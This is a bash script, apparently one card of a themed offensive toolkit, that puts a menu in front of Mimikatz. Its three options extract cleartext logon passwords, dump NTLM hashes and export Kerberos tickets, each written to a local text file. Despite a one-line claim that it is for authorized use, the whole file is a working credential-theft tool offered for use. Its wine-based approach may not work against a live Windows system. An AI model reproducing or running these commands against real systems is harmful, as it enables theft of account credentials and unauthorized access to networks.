#!/bin/bash

CYAN='\033[1;36m'
RESET='\033[0m'

# Menu for the Five of Spades Card
five_of_spades_menu() {
    clear
    echo -e "${CYAN}"
    echo "      _________________________________________________________________________"
    echo "     |                              Five of Spades                             |"
    echo "     |                     Extract Windows Credentials (Mimikatz)              |"
    echo "     |_________________________________________________________________________|"
    echo "     |                                                                         |"
    echo "     |  This card allows you to use Mimikatz to extract credentials from a     |"
    echo "     |  Windows system. This tool is intended for ethical use in authorized    |"
    echo "     |  environments only.                                                     |"
    echo "     |                                                                         |"
    echo "     |                                                                         |"
    echo "     |  1. Extract cleartext passwords                                         |"
    echo "     |  2. Dump NTLM hashes                                                    |"
    echo "     |  3. Export Kerberos tickets                                             |"
    echo "     |  4. Exit                                                                |"
    echo "     |__________________________________________________________________________|"
    echo -e "${RESET}"
    read -p "Enter your choice: " choice
    case $choice in
        1) extract_cleartext_passwords ;;
        2) dump_ntlm_hashes ;;
        3) export_kerberos_tickets ;;
        4) exit 0 ;;
        *) echo "Invalid choice. Try again."; sleep 1; five_of_spades_menu ;;
    esac
}

# Extract cleartext passwords
extract_cleartext_passwords() {
    clear
    echo -e "${CYAN}Extracting cleartext passwords...${RESET}"
    if [[ -f ./mimikatz.exe ]]; then
        wine ./mimikatz.exe privilege::debug sekurlsa::logonpasswords exit > passwords.txt
        echo -e "${CYAN}Passwords saved to passwords.txt.${RESET}"
    else
        echo -e "${CYAN}Error: Mimikatz not found in the current directory.${RESET}"
        echo "Ensure mimikatz.exe is in the same directory as this script."
    fi
    read -n 1 -s -r -p "Press any key to return to the menu..."
    five_of_spades_menu
}

# Dump NTLM hashes
dump_ntlm_hashes() {
    clear
    echo -e "${CYAN}Dumping NTLM hashes...${RESET}"
    if [[ -f ./mimikatz.exe ]]; then
        wine ./mimikatz.exe privilege::debug sekurlsa::logonpasswords exit > ntlm_hashes.txt
        grep -Eo "NTLM.*" ntlm_hashes.txt > extracted_ntlm_hashes.txt
        echo -e "${CYAN}NTLM hashes saved to extracted_ntlm_hashes.txt.${RESET}"
    else
        echo -e "${CYAN}Error: Mimikatz not found in the current directory.${RESET}"
        echo "Ensure mimikatz.exe is in the same directory as this script."
    fi
    read -n 1 -s -r -p "Press any key to return to the menu..."
    five_of_spades_menu
}

# Export Kerberos tickets
export_kerberos_tickets() {
    clear
    echo -e "${CYAN}Exporting Kerberos tickets...${RESET}"
    if [[ -f ./mimikatz.exe ]]; then
        wine ./mimikatz.exe privilege::debug sekurlsa::tickets exit > kerberos_tickets.txt
        echo -e "${CYAN}Kerberos tickets saved to kerberos_tickets.txt.${RESET}"
    else
        echo -e "${CYAN}Error: Mimikatz not found in the current directory.${RESET}"
        echo "Ensure mimikatz.exe is in the same directory as this script."
    fi
    read -n 1 -s -r -p "Press any key to return to the menu..."
    five_of_spades_menu
}

five_of_spades_menu
